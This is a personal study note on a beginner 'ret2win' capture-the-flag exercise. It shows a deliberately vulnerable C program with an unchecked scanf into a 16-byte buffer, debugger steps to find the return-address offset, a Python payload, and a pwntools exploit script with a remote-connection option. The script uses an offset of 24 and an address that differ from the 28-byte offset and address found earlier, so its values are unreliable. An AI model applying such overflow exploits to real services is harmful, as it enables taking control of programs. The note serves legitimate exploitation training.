
``` source 
#include <stdio.h>

void hacked()
{
    printf("This function is TOP SECRET! How did you get in here?! :O\n");
}

void register_name()
{
    char buffer[16];

    printf("Name:\n");
    scanf("%s", buffer);
    printf("Hi there, %s\n", buffer);
}

int main()
{
    register_name();

    return 0;
}
```

- We will override the return address of register_name(), to the hacked function.
- We can do the because there is nothing stopping us from going beyond 16 byte in the buffer. 
- We find the address of hacker()
``` info_functions

0x08049000  _init
0x08049030  printf@plt
0x08049040  puts@plt
0x08049050  __libc_start_main@plt
0x08049060  __isoc99_scanf@plt
0x08049070  _start
0x080490b0  _dl_relocate_static_pie
0x080490c0  __x86.get_pc_thunk.bx
0x080490d0  deregister_tm_clones
0x08049110  register_tm_clones
0x08049150  __do_global_dtors_aux
0x08049180  frame_dummy
0x08049182  hacked
0x080491ad  register_name
0x08049203  main
0x0804921f  __x86.get_pc_thunk.ax
0x08049230  __libc_csu_init
0x08049290  __libc_csu_fini
0x08049291  __x86.get_pc_thunk.bp
0x08049298  _fini
```

- Since the program is compiled without pie, its the same address each time. 
- hacker memory address: `0x08049182`
- We now need to find how many bytes we should overwrite in the buffer.
```
pwndbg> cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

This we will feed as input when the program promps us:
```


![[Pasted image 20250124231936.png]]

- Observe the EIP (instruction pointer), the characters that made it there is 'haaa', so we should find this in the payload and change them to the address of hacker. 

finding its offsett:
```
pwndbg> cyclic -l haaa
Finding cyclic pattern of 4 bytes: b'haaa' (hex: 0x68616161)
Found at offset 28
```

So we make a payload with 28 wildcard characters + hacked() function: 
```
payload = 'A'*28 + '\x82\x91\x04\x08'

file = open("payload",'w')
file.write(payload)
print(payload)
```
- NOTICE: Format of the address. 


```
┌──(kali㉿windowsaids)-[~/CTF/Cryptocat/pwn/binary_exploitation_101/03-return_to_win]
└─$ ./ret2win < payload
Name:
Hi there, AAAAAAAAAAAAAAAAAAAAAAAAAAAA��
This function is TOP SECRET! How did you get in here?! :O
Segmentation fault (core dumped)
```

- Observe that the program craches afterwards, if we dont want this we have to make the hackerd functions return to another place. 
- return of register_name: `0x08049202`

We also have use pwn tools - here is a basic script:
```
from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './ret2win'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

# How many bytes to the instruction pointer (EIP)?
padding = 24

payload = flat(
    b'A' * 24,
    elf.functions.hacked  # 0x401142
)

# Save the payload to file
write('payload', payload)

# Send the payload
io.sendlineafter(b':', payload)

# Receive the flag
io.interactive()
```